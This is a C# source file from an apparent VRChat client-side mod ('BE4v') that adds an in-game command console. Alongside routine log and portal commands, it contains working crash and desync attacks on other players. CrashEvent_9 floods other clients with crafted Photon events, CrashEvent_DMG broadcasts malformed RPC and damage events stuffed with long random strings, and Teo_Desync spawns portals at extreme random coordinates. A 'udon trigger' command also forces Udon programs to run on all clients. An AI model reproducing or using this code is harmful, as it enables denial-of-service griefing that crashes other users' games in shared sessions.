using System;
using System.Linq;
using System.Text;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using VRC;
using VRC.Udon;
using VRC.SDKBase;
using BE4v.SDK;
using BE4v.SDK.CPP2IL;
using IL2Photon.Pun;
using IL2Photon.Realtime;
using IL2ExitGames.Client.Photon;

namespace BE4v.Mods
{
    public static class Mod_Console
    {
        public static int cv = 42;
        public static bool isLog = false;
        public static bool isLogDetail = false;
        public static bool isCrash = false;
        public static bool crashToggle = false;
        public static int crashInt = 4;
        public static IL2Array<byte> crashBytes;
        public static IL2Array<byte> crashBytes2;

        public static string worldId = "wrld_26758d47-a511-441a-85d2-83d16936b1a0";
        public static string instanceId = "123456";


        public static void CrashUpdate()
        {
            if (isCrash)
            {
                CrashEvent_9();
            }
            if (crashToggle)
            {
                CrashEvent_DMG();
            }
        }

        public static void CrashEvent_DMG()
        {
            VRC_EventHandler.VrcEvent vrcEvent = new VRC_EventHandler.VrcEvent
            {
                EventType = VRC_EventHandler.VrcEventType.SendRPC,
                Name = RandomGenerator.RandomString(240),
                ParameterObject = Network.SceneEventHandler.gameObject,
                ParameterInt = 1,
                ParameterFloat = 0f,
                ParameterString = RandomGenerator.RandomString(840),
                ParameterBoolOp = VRC_EventHandler.VrcBooleanOp.Unused,
                ParameterBytes = new byte[0]
            };
            VRC_EventHandler.VrcEvent vrcEvent2 = new VRC_EventHandler.VrcEvent
            {
                EventType = VRC_EventHandler.VrcEventType.AddDamage,
                Name = RandomGenerator.RandomString(240),
                ParameterObject = Network.SceneEventHandler.gameObject,
                ParameterInt = 1,
                ParameterFloat = 0f,
                ParameterString = RandomGenerator.RandomString(840),
                ParameterBoolOp = VRC_EventHandler.VrcBooleanOp.Unused,
                ParameterBytes = new byte[0]
            };
            Network.SceneEventHandler.TriggerEvent(vrcEvent, VRC_EventHandler.VrcBroadcastType.AlwaysUnbuffered, VRCPlayer.Instance.gameObject, 0f);
            Network.SceneEventHandler.TriggerEvent(vrcEvent2, VRC_EventHandler.VrcBroadcastType.AlwaysUnbuffered, VRCPlayer.Instance.gameObject, 0f);
        }

        public static void CrashEvent_9()
        {
            LoadBalancingClient client = PhotonNetwork.NetworkingClient;
            for (int i = 0; i < 80; i++)
            {
                client.OpRaiseEvent(9, crashBytes.ptr, new RaiseEventOptions
                {
                    Receivers = ReceiverGroup.Others,
                    CachingOption = EventCaching.DoNotCache
                }, SendOptions.SendUnreliable);
            }
        }

        public static void Teo_Desync()
        {
            Random r = new Random();
            Network.Instantiate(VRC_EventHandler.VrcBroadcastType.Always, "Portals/PortalInternalDynamic", new Vector3(r.Next(int.MinValue, int.MaxValue), r.Next(int.MinValue, int.MaxValue), r.Next(int.MinValue, int.MaxValue)), Quaternion.identity);
            Network.Instantiate(VRC_EventHandler.VrcBroadcastType.Always, "Portals/PortalInternalDynamic", new Vector3(r.Next(int.MinValue, int.MaxValue), r.Next(int.MinValue, int.MaxValue), r.Next(int.MinValue, int.MaxValue)), Quaternion.identity);
            /*
            UdonBehaviour[] udons = UnityEngine.Object.FindObjectsOfType<UdonBehaviour>();
            foreach (var x in udons)
            {
                Network.RPC(VRC_EventHandler.VrcTargetType.All, x.gameObject, "UdonSyncRunProgramAsRPC", new IntPtr[] { new IL2String("Play").ptr });
            }
            */
        }

        static Mod_Console()
        {
            crashBytes = new IL2Array<byte>(8, IL2SystemClass.Byte);
            crashBytes.Static = true;
        }
        public static void CreateArray()
        {
            byte[] LagData = new byte[8];
            byte[] IDOut = BitConverter.GetBytes(int.Parse(VRC.Player.Instance.PhotonPlayer.ActorNumber + "00001"));
            Buffer.BlockCopy(IDOut, 0, LagData, 0, 4);
            for (int i = 0; i < 8; i++)
            {
                crashBytes[i] = LagData[i];
            }
        }

        public async static void CommandToClient(string command)
        {
            string[] args;
            try
            {
                args = SplitCommandLine(command).ToArray();
            }
            catch { return; }
            switch (args[0])
            {
                case "clear":
                    {
                        Console.Clear();
                        break;
                    }
                case "help":
                    {
                        Console.WriteLine("~~~ [ HELP For BE4v ] ~~~");
                        Console.WriteLine("- connect World_Id:InstanceId");
                        break;
                    }
                case "log":
                    {
                        isLog = !isLog;
                        if (isLog)
                        {
                            Console.WriteLine("Logs enabled!");
                        }
                        else
                        {
                            Console.WriteLine("Logs disabled!");
                        }
                        break;
                    }
                case "log2":
                    {
                        isLogDetail = !isLogDetail;
                        if (isLogDetail)
                        {
                            Console.WriteLine("Logs detail enabled!");
                        }
                        else
                        {
                            Console.WriteLine("Logs detail disabled!");
                        }
                        break;
                    }
                case "cv":
                    {
                        if (int.TryParse(args[1], out int result))
                        {
                            cv = result;
                            Console.WriteLine("Set value: " + result);
                        }
                        break;
                    }
                case "portal":
                    {
                        if (args.Length > 1)
                        {
                            if (args[1] == "set")
                            {
                                if (args.Length > 2)
                                {
                                    string[] worldData = args[2].Split(':');
                                    instanceId = worldData[0];
                                    if (worldData.Length > 1)
                                        instanceId = worldData[1];
                                }
                                $"New portal settings: {worldId}:{instanceId}".RedPrefix("Portal Set");
                                break;
                            }
                        }
                        return;
                    }
                default: return;
            }
            Threads.consoleRead = null;
        }
        public static void Command(string command)
        {
            string[] args;
            try
            {
                args = SplitCommandLine(command).ToArray();
            }
            catch { return; }
            switch (args[0])
            {
                case "udon":
                    {
                        if (args.Length > 1)
                        {
                            if (args[1] == "list")
                            {
                                try
                                {
                                    UdonBehaviour[] udons = UnityEngine.Object.FindObjectsOfType<UdonBehaviour>();
                                    foreach (var x in udons)
                                    {
                                        Console.WriteLine("- [" + x.gameObject.name + "] -");
                                        string[] programs = x.GetPrograms();
                                        Console.WriteLine("{");
                                        foreach (var y in programs)
                                        {
                                            Console.WriteLine("\t- " + y);
                                        }
                                        Console.WriteLine("}");
                                    }
                                }
                                catch { "Udon is bad!".RedPrefix("WARN"); }
                            }
                            else if (args[1] == "trigger")
                            {
                                if (args.Length > 2)
                                {
                                    GameObject gameObject = GameObject.Find(args[2]);
                                    if (gameObject == null)
                                    {
                                        Console.WriteLine(args[2] + " not found!");
                                        break;
                                    }
                                    if (args.Length > 3)
                                    {
                                        Network.RPC(VRC_EventHandler.VrcTargetType.All, gameObject, "UdonSyncRunProgramAsRPC", new IntPtr[] { new IL2String(args[3]).ptr });
                                    }
                                }
                            }
                        }
                        break;
                    }
                case "portal":
                    {
                        if (args.Length > 1)
                        {
                            if (args[1] == "create")
                            {
                                if (args.Length > 2)
                                {
                                    string[] worldData = args[2].Split(':');
                                    UserUtils.SpawnPortal(VRCPlayer.Instance.transform, worldData[0], (worldData.Length > 1) ? worldData[1] : instanceId);
                                    ($"Created portal: {worldId}:" + ((worldData.Length > 1) ? worldData[1] : instanceId)).RedPrefix("Create portal");
                                }
                            }
                        }
                        break;
                    }
                case "crash":
                    {
                        if (args.Length > 1)
                        {
                            CreateArray();
                            if (args[1] == "toggle")
                            {
                                isCrash = !isCrash;
                                if (isCrash)
                                {
                                    Console.WriteLine("Crash event enabled!");
                                }
                                else
                                {
                                    Console.WriteLine("Crash event disabled!");
                                }
                                break;
                            }
                            if (args[1] == "count")
                            {
                                if (args.Length > 2)
                                {
                                    if (int.TryParse(args[2], out int pars))
                                    {
                                        crashInt = pars;
                                    }
                                }
                            }
                            if (args[1] == "toggle2")
                            {
                                crashToggle = !crashToggle;
                                if (crashToggle)
                                {
                                    foreach(var patch in Patch.Patch_MorePortals.patch)
                                    {
                                        if (patch?.Enabled == false)
                                            patch.Enabled = true;
                                    }
                                    Console.WriteLine("Crash event enabled!");
                                }
                                else
                                {
                                    foreach (var patch in Patch.Patch_MorePortals.patch)
                                    {
                                        if (patch?.Enabled == true)
                                            patch.Enabled = false;
                                    }
                                    Console.WriteLine("Crash event disabled!");
                                }
                                break;
                            }
                        }
                        break;
                    }
                case "gc":
                    {
                        Mod_AutoClearRAM.Clear();
                        break;
                    }
            }
        }


        public static IEnumerable<string> SplitCommandLine(string commandLine)
        {
            bool inQuotes = false;

            return commandLine.Split(c =>
            {
                if (c == '\"')
                    inQuotes = !inQuotes;

                return !inQuotes && c == ' ';
            })
                              .Select(arg => arg.Trim().TrimMatchingQuotes('\"'))
                              .Where(arg => !string.IsNullOrEmpty(arg));
        }
        public static IEnumerable<string> Split(this string str,
                                        Func<char, bool> controller)
        {
            int nextPiece = 0;

            for (int c = 0; c < str.Length; c++)
            {
                if (controller(str[c]))
                {
                    yield return str.Substring(nextPiece, c - nextPiece);
                    nextPiece = c + 1;
                }
            }

            yield return str.Substring(nextPiece);
        }

        public static string TrimMatchingQuotes(this string input, char quote)
        {
            if ((input.Length >= 2) &&
                (input[0] == quote) && (input[input.Length - 1] == quote))
                return input.Substring(1, input.Length - 2);

            return input;
        }

    }
}
